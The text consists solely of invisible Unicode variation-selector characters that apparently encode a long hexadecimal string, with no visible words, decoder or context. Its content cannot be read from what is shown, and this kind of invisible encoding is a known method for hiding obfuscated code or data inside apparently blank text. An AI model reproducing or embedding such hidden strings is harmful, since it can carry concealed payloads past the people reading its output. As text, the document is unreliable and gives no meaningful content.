󠄨󠄡󠄦󠄣󠅖󠄥󠅕󠅔󠅔󠅕󠄣󠄣󠄢󠄥󠅖󠄣󠄣󠅕󠄠󠄩󠅖󠄥󠄩󠄡󠅕󠄤󠄤󠄣󠄧󠄢󠄧󠅖󠄤󠅖󠄤󠄤󠄠󠄥󠄢󠄥󠄠󠄥󠅖󠄣󠅖󠄩󠅕󠄥󠄧󠄠󠄢󠄨󠄤󠄦󠄡󠅖󠅒󠄧󠄩󠅑󠄢󠅖󠄢󠄨󠄨󠄥󠅒󠄤󠅓󠅑󠄣󠄨󠅖󠄣󠄧󠅔󠄥󠄨󠅒󠄤󠅑󠄡󠅑󠅒󠄠󠄧󠄨󠅓󠄦󠅑󠅔󠄩󠅑󠄢󠄧󠅕󠄨󠄣󠅖󠄢󠅔󠅔󠄡󠅖󠅔󠄥󠅓󠄢󠄤󠅓󠄢󠅔󠄢󠄧󠄣󠅑󠄢󠅒󠄢󠄦󠄧󠄩󠅔󠅒󠄤󠄤󠅕󠄣󠅖󠄨󠅒󠄢󠅖󠄨󠄡󠄤󠄧󠄠󠄢󠄢󠄦󠄣󠄧󠅖󠄥󠅕󠄩󠅒󠅔󠄩󠄧󠅒󠅔󠅕󠄤󠄢󠅕󠄠󠄥󠄠󠅓󠅕󠄩󠅔󠄦󠅒󠄡󠅖󠄧󠅔󠄦󠄩󠄣󠅖󠄩󠄥󠄦󠅓󠅖󠄢󠅓󠅓󠄡󠄦󠅕󠄥󠅓󠄤󠄠󠄢󠅑󠅕󠄧󠄦󠄨󠄤󠄥󠄤󠄨󠄡󠄣󠅕󠄠󠅖󠄠󠄧󠄡󠅖󠅑󠄠󠅒󠅒󠅓󠅑󠄧󠄠󠅔󠅓󠄦󠄨󠅓󠄦󠅔󠄡󠄨󠅔󠅔󠄠󠄨󠄢󠄩󠄠󠄧󠄨󠅕󠅖󠅓󠅒󠅑󠅔󠄨󠅖󠅔󠅓󠄤󠄠󠄦󠄡󠄤󠄦󠄨󠄨󠄧󠄣󠅖󠄩󠅖󠄣󠅒󠅒󠅖󠄥󠄥󠅔󠅑󠄥󠄨󠄢󠅕󠄤󠄡󠅒󠄤󠅓󠅖󠄡󠅔󠅒󠄧󠄧󠅒󠅒󠄠󠅔󠄧󠄩󠄨󠅕󠄣󠅒󠄧󠄠󠅕󠄠󠄥󠅕󠄧󠄢󠅖󠅑󠅕󠅖󠄤󠅒󠄠󠄠󠅕󠄥󠄤󠅔󠄣󠅔󠅖󠅔󠄨󠅔󠄢󠅔󠄠󠄣󠅒󠄩󠅒󠅔󠄧󠄩󠄨󠄢󠅓󠅔󠄠󠄦󠄧󠄨󠅔󠄩󠅕󠄦󠄥󠄤󠅖󠅒󠅓󠅔󠅓󠄩󠄢󠄦󠅓󠄢󠄤󠅖󠄢󠅓󠄨󠄤󠄡󠄨󠄤󠄡󠅓󠅒󠄦󠅖󠅓󠅑󠄡󠅖󠅕󠄦󠅖󠅖󠅔󠅖󠄥󠄩󠅓󠄧󠅕󠄩󠄨󠅒󠄦󠄩󠅑󠄢󠅖󠅓󠄩󠄨󠄢󠄠󠅓󠄣󠅓󠅕󠅖󠄣󠄡󠅕󠅔󠄣󠅔󠅖󠅖󠄤󠄧󠅑󠄠󠅑󠄨󠄨󠄡󠄠󠅓󠄣󠄠󠅓󠄨󠅑󠄤󠅖󠅕󠄠󠅑󠅕󠅑󠄨󠄥󠅑󠄦󠄠󠄩󠄡󠅓󠅖󠄩󠄡󠄤󠅔󠄦󠄦󠄥󠄣󠄩󠄠󠅑󠅖󠄩󠄢󠄤󠅑󠅔󠄩󠄡󠄤󠄤󠅖󠅖󠄤󠄥󠄤󠄤󠄣󠄠󠄨󠄤󠅑󠅑󠄦󠄥󠄦󠄠󠄧󠄧󠄥󠄠󠅔󠅔󠄠󠅔󠄠󠄩󠄤󠄢󠄧󠄢󠄧󠅒󠄨󠄢󠄥󠅑󠄧󠅓󠅕󠄧󠅖󠄧󠅓󠄤󠄡󠄢󠄡󠄤󠅔󠄥󠄦󠅔󠄣󠅔󠄣󠅓󠄠󠅓󠄤󠄤󠄨󠄣󠄩󠄥󠅖󠄠󠄠󠅑󠄦󠄥󠅒󠄢󠅑󠄣󠅔󠅔󠄢󠄢󠄣󠄦󠄩󠄣󠄥󠄠󠅕󠄣󠅒󠄨󠅕󠅔󠄦󠄦󠅒󠄦󠅔󠅓󠅑󠄦󠅒󠅔󠅕󠅑󠄥󠄢󠅔󠅓󠅖󠅖󠄦󠄢󠄦󠅔󠄠󠄩󠄥󠅑󠅒󠄡󠄩󠄩󠄢󠄧󠄦󠄣󠅓󠅕󠅔󠄨󠄩󠅔󠄧󠄩󠄥󠄧󠅑󠅔󠄠󠄢󠄩󠄠󠄡󠄠󠄣󠄡󠅔󠅓󠄠󠅖󠅑󠄣󠄨󠅖󠄡󠄨󠄥󠄥󠅓󠅓󠄣󠄨󠄥󠅔󠄢󠄧󠅔󠄣󠄣󠄧󠄥󠄣󠄧󠄩󠅒󠄥󠄥󠄧󠄨󠄡󠅑󠅔󠅖󠄠󠅖󠅖󠄠󠅔󠄡󠄥󠄤󠄠󠅔󠄥󠄤󠄦󠄥󠅑󠄡󠄡󠄨󠅓󠄤󠄣󠄠󠄡󠄠󠅖󠄩󠄩󠄨󠄦󠄥󠄤󠄢󠅕󠄣󠄡󠄣󠅔󠄢󠄤󠄣󠄩󠄢󠅒󠄨󠄥󠅔󠅔󠅕󠄡󠄠󠄩󠅖󠄥󠄩󠄠󠄨󠅒󠄤󠄥󠄤󠄡󠄡󠄢󠄠󠄤󠄩󠅒󠄢󠄨󠄩󠄧󠄢󠄣󠅕󠅒󠄤󠄣󠄤󠄤󠄥󠅕󠄤󠄤󠅑󠅑󠄥󠅓󠄣󠅕󠅔󠄡󠄧󠄥󠄡󠄨󠄧󠄧󠅕󠅔󠅑󠄡󠅓󠄧󠅑󠄧󠅔󠅒󠅔󠄡󠅒󠄡󠄩󠄥󠅖󠄤󠄧󠄩󠅒󠄧󠄩󠅓󠅒󠄤󠅑󠄣󠄨󠅔󠄠󠄩󠄧󠅒󠄨󠅔󠄠󠄡󠄠󠄩󠄢󠅖󠅕󠄢󠅖󠅒󠄠󠄢󠅓󠄢󠅖󠅑󠄧󠄣󠄦󠅕󠄥󠄢󠄧󠄧󠅓󠄡󠄨󠄠󠅔󠅖󠄢󠄥󠄦󠅖󠅓󠄩󠄢󠅒󠅕󠄨󠄦󠄧󠄦󠄣󠄧󠄣󠄣󠄨󠄥󠅖󠄥󠄩󠅕󠅖󠄥󠄥󠅖󠅕󠄧󠄩󠄦󠅑󠅕󠅕󠅕󠄣󠄠󠄡󠅓󠅑󠄤󠄩󠄨󠄣󠄩󠅔󠄥󠄧󠅖󠅒󠄨󠄤󠅒󠄩󠄨󠄤󠅑󠅔󠅕󠄩󠄠󠅕󠄡󠄡󠄩󠄧󠄨󠅖󠄩󠄢󠅕󠄩󠅖󠄠󠅖󠄤󠅑󠄤󠄢󠄡󠄣󠄧󠅒󠄡󠅒󠅕󠄤󠄦󠄤󠄨󠅕󠄢󠄧󠅕󠄥󠅕󠄥󠅒󠄢󠅔󠄥󠄣󠄩󠅒󠅔󠅖󠅔󠅓󠅒󠄢󠅖󠄡󠄧󠅔󠅓󠄤󠅖󠄠󠅖󠄧󠅒󠄠󠅖󠄨󠄧󠅒󠄦󠄧󠅒󠅓󠄨󠅑󠅕󠄢󠄤󠄢󠄡󠅕󠄣󠅓󠅒󠄢󠄩󠅔󠄥󠅑󠅒󠅔󠅔󠄨󠅓󠅔󠄣󠅔󠄣󠅒󠄠󠅖󠄦󠄤󠄠󠅔󠅒󠄣󠄢󠄦󠄧󠅕󠄠󠅖󠅓󠄧󠄤󠅔󠄣󠄩󠄩󠄩󠄣󠄤󠄢󠄤󠄢󠄧󠄤󠄢󠄧󠄩󠄢󠄡󠄩󠅖󠄩󠄤󠄠󠄩󠄥󠅔󠄥󠄩󠄩󠄨󠄣󠅔󠄨󠅕󠄧󠄠󠅕󠅓󠅒󠅕󠅑󠄡󠅖󠅓󠄢󠅑󠄢󠅕󠄧󠄤󠄨󠅑󠅓󠄤󠄦󠄧󠄢󠄤󠅓󠅒󠅔󠅓󠄡󠅑󠅕󠄧󠄥󠅓󠄨󠄢󠄣󠄥󠅑󠅒󠄡󠅒󠅖󠄩󠄣󠅖󠄡󠄦󠅓󠅓󠅑󠄣󠅒󠄧󠅒󠅕󠄩󠅔󠅔󠄥󠄦󠄧󠄩󠄡󠅖󠄦󠄤󠄨󠅑󠄦󠅔󠄠󠄢󠅒󠅔󠄧󠅑󠅖󠅔󠅑󠄤󠄠󠄨󠄡󠅒󠄧󠄦󠄩󠄩󠄦󠄤󠄨󠄡󠄤󠄡󠄦󠄩󠄠󠄧󠅖󠄣󠄩󠄩󠄧󠄢󠄤󠄠󠄠󠅖󠄨󠅔󠄧󠅔󠄠󠄠󠄥󠄩󠄥󠄨󠄢󠄠󠄡󠅖󠄢󠄥󠄠󠄨󠄥󠄨󠅕󠅓󠄤󠅕󠄩󠄣󠅔󠅒󠄢󠄥󠄨󠄠󠄩󠅒󠅒󠅒󠄧󠅒󠅔󠄠󠅖󠄤󠄤󠅔󠅒󠄨󠄠󠄣󠄩󠄧󠅕󠄨󠅓󠅕󠅑󠅒󠄦󠅒󠅓󠅖󠅖󠄤󠄣󠅒󠅔󠄥󠄧󠄡󠄩󠅒󠅔󠄠󠅓󠄩󠅓󠄣󠄡󠅕󠅕󠄧󠄤󠄠󠅕󠅕󠄢󠄡󠄤󠄨󠄨󠄥󠄩󠄩󠅒󠄡󠄩󠄧󠄢󠅖󠅒󠄦󠅑󠄠󠄡󠅕󠅑󠅓󠄧󠅓󠅕󠅕󠅕󠄡󠄥󠄠󠄦󠅔󠄧󠄨󠄥󠄤󠄠󠄠󠄧󠄥󠅒󠅑󠅓󠄧󠅕󠅓󠄧󠄤󠄦󠄤󠄦󠅑󠄧󠄡󠅕󠅔󠄩󠄦󠄧󠅓󠄩󠄠󠄤󠄤󠄧󠄣󠅕󠄨󠄠󠅔󠄤󠅑󠅓󠄢󠄦󠄨󠄠󠄣󠄠󠄤󠅕󠅖󠅒󠄡󠄨󠅔󠄤󠄧󠄦󠄨󠄠󠄦󠄥󠄥󠄥󠄩󠄦󠄨󠅒󠅑󠅑󠅓󠄢󠄡󠄣󠄠󠅒󠄢󠄢󠄤󠅒󠄢󠄨󠄩󠄩󠄡󠄠󠅖󠄦󠄦󠄦󠄠󠅕󠅒󠄢󠄦󠅑󠅔󠄢󠅔󠅓󠄩󠄧󠄡󠅒󠄤󠄠󠅑󠄧󠄠󠄣󠅕󠄨󠄦󠄧󠄩󠄡󠄦󠄡󠅑󠅒󠅓󠄦󠅖󠅒󠄩󠄧󠄦󠄠󠄡󠄧󠅔󠄢󠅒󠄢󠄨󠄦󠅑󠅑󠅖󠄩󠄥󠄩󠅖󠅖󠄢󠄤󠅒󠄦󠄣󠄩󠄧󠄡󠄦󠄧󠅔󠅓󠄣󠅔󠅔󠅒󠄣󠄤󠄤󠅔󠄣󠄦󠄥󠅒󠄡󠅖󠅑󠅖󠅓󠅒󠄦󠄨󠄧󠄤󠄢󠄥󠄧󠅓󠅕󠄩󠄦󠅒󠅕󠄦󠅑󠅔󠅕󠄡󠄡󠅓󠅔󠄧󠄡󠄤󠅑󠄢󠄨󠄣󠅓󠅑󠅒󠄥󠅓󠅖󠄣󠄩󠅔󠄨󠅑󠅖󠅓󠅒󠄨󠄩󠄦󠄤󠄩󠅕󠄧󠅕󠅓󠄣󠄥󠄠󠄣󠄢󠅕󠄠󠄥󠅓󠅓󠄠󠄣󠄩󠅕󠄢󠄩󠄩󠅓󠄦󠄥󠄠󠄠󠅑󠄧󠄢󠄢󠄤󠄨󠅒󠄠󠄡󠄠󠄧󠅖󠄡󠅒󠄩󠄡󠄧󠄥󠄦󠄤󠄩󠄨󠄧󠄨󠄣󠅖󠅓󠅔󠅕󠅔󠄢󠄦󠄩󠅔󠄣󠅔󠄨󠄡󠄩󠅖󠄨󠄩󠅕󠄢󠄩󠅑󠅕󠅖󠅑󠄢󠄣󠄩󠅔󠅓󠅕󠄡󠅓󠅔󠄣󠄥󠅖󠄢󠄡󠄡󠄤󠅖󠄧󠅔󠅔󠄧󠅑󠅓󠅓󠅒󠄠󠄥󠄡󠄧󠄤󠄤󠄠󠄣󠄠󠅑󠄣󠄦󠄡󠄢󠄡󠅕󠅔󠄣󠄥󠄤󠄨󠄢󠄠󠄧󠅔󠄡󠄧󠅒󠄤󠄨󠄤󠄣󠅒󠅑󠄥󠅕󠄧󠄦󠄥󠄢󠅑󠅕󠄢󠅔󠄢󠄠󠄣󠄣󠅔󠄨󠅕󠅑󠄠󠄠󠄣󠅕󠅕󠅖󠅔󠄨󠄠󠄥󠄥󠅑󠄧󠅖󠄩󠅒󠄡󠄧󠄡󠅔󠄣󠄤󠄤󠄢󠅑󠅕󠅔󠄥󠅔󠅔󠄢󠅑󠅔󠅖󠅑󠄢󠄡󠅕󠄤󠄤󠄢󠅔󠄨󠄠󠄦󠄧󠅓󠄩󠄣󠅕󠄥󠄨󠅒󠄡󠄣󠄦󠄢󠄡󠄠󠅖󠅓󠅒󠄩󠄤󠄩󠅕󠄧󠄠󠄢󠄠󠄡󠄦󠅕󠄣󠅒󠅒󠅖󠄥󠄡󠄠󠅒󠅑󠅕󠄨󠄤󠄡󠅓󠅕󠅕󠄡󠄨󠄧󠅑󠄣󠄨󠅒󠅕󠄦󠄥󠄦󠅖󠅑󠅖󠅑󠄠󠄩󠄨󠄢󠄢󠄠󠄨󠄣󠄧󠄩󠄣󠅒󠄧󠄤󠅖󠄨󠅒󠄧󠅓󠅓󠄥󠄦󠄢󠅓󠄠󠅑󠅓󠄡󠄣󠅖󠅒󠄠󠄧󠄣󠄤󠅔󠄥󠅓󠄣󠄣󠄧󠅔󠄣󠄥󠅔󠄣󠄧󠅓󠅑󠄧󠅕󠄡󠅒󠄦󠄦󠄡󠅒󠄨󠄠󠅒󠄨󠅖󠄢󠄡󠄣󠅕󠅓󠄢󠅔󠅑󠄣󠅑󠄧󠄥󠄦󠄨󠄩󠅔󠅖󠅔󠅖󠄢󠅒󠄦󠄣󠄠󠅓󠅑󠄣󠅖󠅕󠄦󠅕󠄥󠄢󠅑󠄡󠄩󠄠󠅓󠄦󠅓󠄥󠄦󠄡󠅒󠅓󠄠󠄣󠅒󠅑󠅓󠅖󠅔󠄢󠄩󠅑󠅖󠅖󠄩󠄥󠅕󠄠󠅔󠄦󠄧󠅑󠄢󠄨󠅑󠄧󠅓󠅕󠄦󠄠󠄥󠄡󠄣󠅒󠄢󠄢󠄨󠄥󠅒󠅓󠅒󠅑󠄠󠄠󠅒󠄦󠄥󠅔󠄩󠄠󠄠󠅑󠄥󠅑󠅖󠄠󠄠󠅓󠄦󠄢󠄦󠄢󠄠󠄡󠅔󠄧󠅓󠄩󠄩󠄣󠄨󠄣󠅑󠅑󠄠󠅕󠄤󠅓󠅖󠄣󠄤󠄥󠅒󠅖󠄢󠄤󠄩󠄦󠄣󠅒󠅔󠄢󠄣󠅔󠄩󠄩󠄡󠅒󠄧󠄩󠄠󠄨󠄡󠄢󠄨󠅒󠅕󠄣󠄦󠅒󠄧󠄦󠄡󠄠󠅕󠅑󠄣󠅖󠅑󠅑󠄡󠅖󠄩󠄢󠄤󠄦󠄤󠅔󠅑󠄨󠄢󠅓󠅔󠄡󠄤󠅖󠄥󠄧󠅕󠅔󠄤󠄧󠄨󠄢󠄤󠄥󠄦󠄦󠄠󠅕󠅔󠄤󠅑󠄡󠄢󠅓󠅖󠅔󠅑󠅒󠅑󠅑󠄠󠅔󠄨󠄤󠄤󠅖󠄠󠅓󠅑󠄦󠄥󠄢󠄨󠄡󠄤󠄡󠄨󠄣󠅔󠅖󠄤󠅔󠄥󠄨󠅒󠄡󠅕󠅑󠅒󠄧󠅓󠅕󠄢󠄨󠄥󠅓󠄡󠄠󠅖󠄣󠄢󠅖󠄩󠄥󠅖󠅓󠄨󠄥󠅕󠅔󠅓󠄧󠅓󠄧󠅖󠅕󠅒󠅑󠅔󠄢󠄥󠅕󠄨󠅕󠅕󠄨󠅓󠅒󠄣󠄡󠅑󠄥󠅒󠄧󠄢󠄦󠄧󠅖󠅒󠅓󠅓󠄨󠅕󠄢󠅑󠄡󠄨󠅓󠄨󠄡󠄣󠄤󠄠󠄦󠅒󠄠󠄣󠄥󠄤󠅕󠄥󠄢󠄦󠄨󠅖󠅖󠄤󠄥󠅕󠄠󠄦󠄤󠄥󠅒󠅕󠅖󠄢󠄣󠄣󠄥󠄩󠄣󠄥󠄡󠄤󠄥󠄩󠅒󠄢󠅒󠅕󠄥󠄦󠄨󠅖󠅑󠄡󠅓󠅒󠅒󠄧󠅑󠄣󠅕󠄥󠄩󠄦󠅕󠅕󠄩󠄦󠄢󠅒󠄨󠅓󠄦󠅓󠄩󠅖󠅔󠄠󠅒󠄠󠄩󠅔󠅕󠅓󠅕󠄦󠅓󠄠󠄨󠅖󠄤󠄢󠄣󠄩󠄤󠄩󠅕󠄡󠄣󠄥󠄩󠄡󠅔󠄩󠄩󠄦󠅒󠅑󠅕󠄧󠄨󠅔󠄢󠄢󠅔󠄧󠄦󠄩󠄥󠄦󠄢󠅔󠄥󠅓󠅔󠄥󠄠󠅖󠄩󠄢󠅑󠄨󠄩󠅕󠄣󠄨󠄡󠄥󠅓󠄢󠄩󠄡󠅓󠅕󠄠󠄧󠄦󠄣󠄣󠄡󠄣󠄥󠄡󠄩󠄨󠄦󠄢󠄠󠄢󠅖󠄡󠄤󠅓󠅒󠅑󠄢󠅔󠅒󠄧󠅑󠅔󠄣󠅕󠄦󠄨󠅒󠄨󠄣󠅔󠅑󠅑󠄩󠄢󠄧󠅖󠄥󠄩󠅕󠅕󠅒󠄨󠅔󠄦󠄡󠅔󠄨󠅓󠄢󠄦󠄣󠅖󠅓󠄧󠄡󠄥󠄤󠄢󠄩󠄢󠅖󠄥󠅖󠄥󠄩󠅕󠄦󠅔󠄤󠅕󠅕󠄡󠄤󠄢󠄣󠄧󠅖󠄢󠄩󠄦󠄤󠄠󠄠󠄩󠄡󠄨󠄠󠄦󠅓󠄤󠄡󠅓󠄣󠄥󠄧󠅔󠄠󠅒󠅖󠄤󠄧󠅒󠅔󠄢󠄧󠅑󠄤󠄤󠄨󠅒󠅖󠅕󠄨󠄡󠄢󠅓󠅒󠄡󠄡󠄢󠄢󠅔󠄦󠄠󠅑󠄢󠄧󠅖󠄧󠅖󠅖󠅑󠄢󠅕󠄦󠄣󠅕󠅔󠅑󠄧󠅕󠄨󠅓󠄤󠄠󠄩󠄠󠅔󠅑󠄩󠅔󠄢󠅑󠅓󠅒󠄥󠅑󠄤󠄢󠄦󠄩󠅔󠅑󠄦󠄣󠄠󠄦󠅓󠄣󠄤󠄡󠄢󠅑󠄦󠅒󠄢󠄢󠄥󠄢󠄧󠄣󠅔󠄠󠄡󠄩󠄧󠅕󠅑󠅕󠄦󠅔󠄢󠄥󠄠󠅑󠄩󠅖󠄩󠄧󠄠󠄨󠄢󠄠󠄨󠅕󠅕󠄦󠅔󠄩󠅑󠄣󠄠󠄦󠄥󠄨󠅔󠄣󠅕󠄠󠅓󠄤󠄢󠅓󠄥󠄢󠅓󠄡󠄧󠅑󠄦󠄦󠄣󠅑󠅑󠅔󠅒󠄢󠅑󠅒󠅖󠅓󠄩󠅔󠄢󠅓󠄩󠄨󠄦󠅓󠅒󠅒󠅒󠄧󠅓󠄣󠄤󠅒󠄧󠄣󠄡󠅕󠄠󠅑󠄤󠄤󠄨󠅒󠅒󠄠󠄩󠅒󠅔󠅓󠄣󠄦󠅓󠄩󠄣󠄦󠄢󠄩󠄦󠄠󠄥󠄡󠄩󠅕󠅑󠄨󠄠󠄩󠅔󠄣󠄤󠅕󠄢󠄤󠄤󠄣󠄦󠄥󠅔󠅖󠅖󠄣󠅔󠄦󠅑󠅒󠅖󠅓󠅑󠄣󠄥󠄦󠄤󠄠󠅕󠅖󠄡󠄡󠅕󠄣󠄧󠄦󠅔󠅒󠄨󠅓󠅑󠄨󠅑󠅓󠄨󠄤󠅑󠅑󠄣󠄥󠅖󠄦󠄣󠅕󠄠󠄣󠄤󠅕󠄢󠄤󠄠󠄨󠄨󠄦󠄦󠅑󠄩󠅖󠄠󠄧󠄣󠄤󠄦󠅒󠄣󠄠󠄧󠄡󠄨󠄩󠄡󠄠󠄡󠄠󠄢󠅕󠄥󠅒󠄢󠄣󠅖󠅒󠄣󠄣󠅕󠅑󠄩󠄥󠄩󠅒󠅓󠄧󠅔󠅓󠄦󠅑󠄤󠅓󠄤󠅖󠄧󠅕󠄦󠄠󠄠󠄡󠅖󠅒󠄥󠄧󠄩󠅕󠅔󠄡󠅕󠄠󠅓󠄤󠄠󠅓󠄨󠄦󠄡󠄣󠄧󠅔󠅓󠄤󠄡󠄨󠅔󠄦󠄠󠄧󠅖󠅓󠅑󠄠󠄣󠄥󠄢󠄢󠄨󠄣󠄦󠅔󠅒󠄩󠅑󠄣󠅖󠅔󠅕󠅖󠅒󠅑󠅕󠄢󠄣󠅕󠄩󠄢󠄩󠅔󠄤󠄣󠅔󠄥󠅒󠄧󠅔󠅒󠄥󠅔󠅑󠄥󠄢󠄦󠄤󠅑󠅕󠄦󠅑󠄡󠅖󠄠󠄨󠅑󠅕󠄧󠄧󠄧󠄧󠄦󠄦󠅔󠅑󠅕󠄣󠄦󠅖󠅖󠄣󠅖󠄣󠅖󠅑󠄨󠄠󠄥󠄠󠄥󠄠󠄢󠄤󠅑󠄥󠄡󠄡󠅔󠄥󠅖󠄦󠄦󠅒󠄢󠄠󠄥󠄣󠄨󠄤󠄠󠅔󠄢󠄢󠅖󠄣󠄩󠄥󠅖󠅒󠅑󠄦󠅓󠅓󠄣󠄠󠄣󠄠󠅒󠄡󠄤󠄧󠄧󠅑󠄣󠅓󠅓󠄤󠅑󠄤󠅔󠅔󠅖󠄧󠄤󠄩󠄢󠄥󠅓󠅒󠄠󠄩󠄦󠄦󠄧󠄠󠅑󠄦󠄢󠄡󠄡󠄣󠄧󠄧󠅔󠅔󠄢󠅕󠅔󠅓󠄦󠅕󠄥󠅓󠅒󠄦󠄦󠅑󠄣󠅒󠅕󠅕󠄥󠄨󠄨󠅒󠄡󠅓󠅔󠅕󠄢󠄦󠄤󠅑󠄨󠅕󠄧󠅖󠄡󠅒󠄢󠅖󠄩󠄣󠄠󠄤󠅒󠄡󠄥󠄥󠄠󠄣󠄤󠄧󠄩󠄩󠄨󠄧󠄥󠅕󠄨󠄢󠅑󠅒󠄠󠅒󠄥󠄦󠄨󠄧󠅖󠄢󠄡󠄨󠄠󠅖󠄦󠄧󠄣󠄧󠄨󠄦󠄡󠅒󠄩󠄢󠄧󠄡󠅕󠄦󠄩󠄩󠄠󠄤󠄧󠄤󠄤󠅕󠄩󠅖󠅕󠅓󠄧󠄣󠄦󠄡󠅔󠄣󠅔󠄢󠄣󠅑󠄦󠄣󠄢󠄠󠄥󠄢󠅓󠅓󠄧󠄢󠄢󠅓󠅕󠄢󠄡󠅕󠅔󠄠󠅔󠅒󠄤󠄩󠅓󠄣󠄨󠅒󠄤󠄩󠅓󠅕󠅔󠄥󠅕󠄦󠄤󠅓󠅔󠄠󠄥󠅖󠅖󠄥󠄢󠄦󠄩󠄨󠅑󠄣󠄣󠄤󠅓󠅓󠅖󠄧󠅑󠅓󠅓󠅖󠄧󠄠󠅑󠅔󠄩󠄤󠅕󠅔󠅕󠄦󠅖󠄩󠄩󠅒󠅑󠄢󠄠󠅑󠅑󠅓󠄤󠄥󠅑󠅒󠅓󠄢󠄠󠄧󠄢󠅕󠄨󠅖󠄥󠄣󠅖󠅕󠅔󠅖󠅕󠅕󠅖󠄨󠄤󠅑󠄠󠄤󠅔󠄦󠅑󠄢󠅒󠅓󠄥󠄦󠅑󠄩󠄩󠅓󠄦󠄦󠄥󠅑󠄨󠄥󠄥󠄦󠄨󠄥󠄩󠅔󠄦󠅖󠄠󠅔󠅑󠄢󠄦󠄠󠄥󠄠󠄤󠅒󠅑󠄧󠄩󠅓󠄧󠅒󠄥󠅔󠄥󠄩󠄦󠄥󠅓󠅑󠄨󠄡󠄨󠅖󠄩󠄨󠄤󠅑󠄢󠄢󠄣󠄢󠅔󠄦󠄧󠅒󠅑󠅑󠄩󠄥󠄠󠄥󠄢󠄩󠄠󠄢󠄩󠄨󠄧󠄨󠅑󠅕󠄩󠅓󠅖󠄦󠅓󠄣󠄣󠄤󠄢󠄨󠄦󠅓󠅖󠄤󠅒󠄢󠄦󠅑󠄨󠄠󠄡󠅖󠅔󠄦󠄨󠄡󠄧󠅑󠄠󠄠󠄨󠅖󠅔󠄦󠄦󠄧󠄦󠅔󠅒󠅕󠄦󠅒󠅓󠅑󠅒󠅕󠄥󠄦󠄦󠅒󠅖󠅔󠄦󠄧󠅕󠄧󠄡󠄠󠅒󠄧󠅔󠄠󠅓󠄠󠅔󠄡󠄧󠄠󠄡󠅒󠄥󠄦󠅕󠅖󠄠󠄦󠄧󠄢󠄢󠅑󠄡󠄩󠅖󠅑󠅕󠅔󠅔󠄣󠄢󠅕󠄥󠄨󠄤󠄢󠅕󠄦󠄨󠅖󠄨󠅔󠄥󠄢󠄣󠄦󠅕󠅓󠄠󠄤󠄤󠄤󠅓󠄩󠄡󠅓󠄨󠄣󠅕󠄤󠅖󠄤󠄩󠅖󠄦󠅑󠄣󠅕󠅒󠄢󠅒󠄧󠄩󠅕󠅒󠅑󠄠󠄧󠅒󠄨󠅕󠄦󠄣󠄣󠄨󠄢󠅖󠄡󠄧󠄩󠅓󠅒󠅕󠄦󠅓󠄢󠄤󠅕󠄧󠄡󠄦󠄣󠅕󠅑󠄣󠄦󠄢󠄡󠅔󠄢󠄨󠄥󠅓󠄧󠄥󠄤󠅔󠄢󠄤󠅓󠅑󠄥󠄩󠅒󠄨󠄩󠄤󠅑󠄠󠅕󠄠󠅔󠄠󠄡󠄢󠅓󠅖󠅓󠄤󠅓󠅒󠄤󠄨󠄦󠄥󠅕󠅖󠅑󠄣󠅓󠄣󠅕󠄤󠄤󠅔󠅖󠄢󠄠󠅓󠅔󠄢󠅑󠄢󠅑󠅓󠄨󠄥󠅖󠅖󠅓󠅑󠄤󠄡󠄥󠄢󠅓󠄥󠄨󠅓󠄨󠄥󠄨󠄣󠅒󠄡󠄠󠄥󠅕󠄠󠄧󠄩󠅕󠄧󠄢󠅑󠄡󠅑󠅕󠄨󠅕󠄦󠄡󠅔󠄠󠄡󠄦󠄨󠄥󠄥󠅔󠄡󠅓󠅔󠅔󠄠󠄡󠄧󠅑󠄧󠄢󠄧󠅖󠄡󠄢󠅒󠄢󠄥󠅒󠅖󠄧󠄩󠅑󠄦󠄠󠄧󠄩󠄥󠄢󠄦󠄩󠄡󠄨󠄡󠄣󠄢󠄣󠄨󠄧󠅒󠄢󠄠󠄢󠄦󠄧󠅖󠄣󠄣󠄥󠄤󠄠󠅔󠄥󠄧󠄩󠄣󠄩󠅔󠄡󠄤󠄦󠄥󠄣󠄠󠅕󠄨󠅖󠅑󠄠󠄨󠅖󠄢󠄥󠅑󠅓󠄢󠄡󠄡󠅕󠄩󠄥󠅓󠄨󠄧󠄣󠄧󠅒󠄤󠄠󠄡󠄢󠄥󠅑󠅒󠅖󠄦󠄥󠄦󠅕󠄧󠄩󠄣󠅑󠅑󠅖󠅓󠄣󠄢󠅕󠅑󠄡󠅕󠄤󠄩󠄢󠄦󠅓󠄧󠅑󠄧󠅖󠄨󠄠󠄩󠄧󠄤󠅖󠄠󠄧󠅕󠅒󠄨󠅑󠅑󠄠󠅑󠄣󠅒󠅑󠅓󠅖󠅖󠄧󠄩󠄧󠄦󠄠󠄢󠅒󠄣󠄤󠄤󠅖󠄡󠅒󠄢󠄤󠄣󠄣󠄣󠅔󠄡󠅕󠅔󠄢󠅔󠄡󠅔󠄤󠅕󠄠󠅕󠅒󠄡󠅓󠅓󠄧󠄩󠄦󠄩󠄠󠄥󠅒󠄢󠄧󠅖󠄨󠄩󠅓󠄢󠅕󠄨󠅔󠄥󠅖󠅒󠄦󠄣󠄦󠄢󠄥󠄤󠄣󠄦󠄨󠄨󠄨󠄧󠅔󠅓󠄨󠅑󠄦󠄠󠅔󠅖󠄤󠅔󠄥󠄥󠄢󠄦󠄢󠅖󠅖󠅔󠄤󠅒󠅕󠅔󠅑󠅔󠄧󠄨󠄤󠅑󠄩󠄩󠅕󠅓󠄤󠄣󠄦󠅔󠅓󠅖󠅑󠅖󠄧󠄤󠄠󠄣󠄦󠄩󠄦󠄩󠅒󠄥󠄠󠄣󠄦󠅔󠄩󠅓󠅕󠄨󠄦󠄥󠄣󠄦󠄢󠅒󠄦󠅒󠅕󠅓󠄥󠄢󠅒󠄦󠄤󠅕󠄩󠅒󠄦󠄢󠅔󠄡󠅕󠄡󠄩󠄣󠄢󠄢󠄦󠄩󠅑󠄤󠅒󠅓󠅓󠄦󠄠󠄤󠄥󠅓󠄠󠅕󠅑󠄩󠄢󠅓󠄡󠄣󠄦󠄩󠅔󠅓󠄥󠅒󠅖󠅓󠄤󠅖󠅓󠄡󠅒󠄨󠄨󠅕󠄨󠄢󠄩󠄡󠄤󠄤󠅔󠄣󠅕󠅑󠄡󠅓󠅓󠅖󠅖󠄩󠄠󠄡󠅓󠄤󠅓󠅑󠄦󠄦󠄧󠄦󠄥󠄨󠄥󠅕󠅓󠄦󠄡󠄢󠄩󠅓󠅑󠄧󠄣󠄣󠅖󠅔󠄥󠄦󠄨󠅒󠄠󠅓󠄡󠅖󠄥󠄦󠅒󠅕󠄢󠅒󠅑󠅓󠄣󠅔󠅓󠄢󠄦󠄩󠅕󠄡󠄧󠅒